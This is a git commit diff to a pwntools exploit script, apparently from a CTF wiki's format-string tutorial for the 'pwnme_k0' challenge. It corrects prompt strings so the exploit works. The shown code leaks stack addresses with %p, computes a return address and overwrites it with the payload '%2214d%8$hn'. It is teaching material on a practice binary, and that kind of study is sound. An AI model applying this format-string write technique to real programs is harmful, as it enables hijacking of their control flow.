2286168763e0ccd5b34492e22f1af7aa64ab1389
hacker-mao <34244245+hacker-mao@users.noreply.github.com>
2018-04-14 01:10:56 +0800

    Update exp.py
    修改了脚本的小小错误，导致打不成功

--- docs/pwn/fmtstr/example/三个白帽-pwnme_k0/exp.py
+++ docs/pwn/fmtstr/example/三个白帽-pwnme_k0/exp.py
@@ -5,9 +5,9 @@ if args['REMOTE']:
     sh = remote(11, 11)
 else:
     sh = process('./pwnme_k0')
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline('a' * 8)
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline('%p' * 9)
 sh.recvuntil('>')
 sh.sendline('1')
@@ -19,9 +19,9 @@ rbp = int(data[5], 16)
 ret_addr = rbp - 0x38
 sh.recvuntil('>')
 sh.sendline('2')
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 sh.sendline(p64(ret_addr))
-sh.recvuntil(':\n')
+sh.recvuntil(': \n')
 payload = '%2214d%8$hn'
 sh.sendline(payload)
 sh.recvuntil('>')
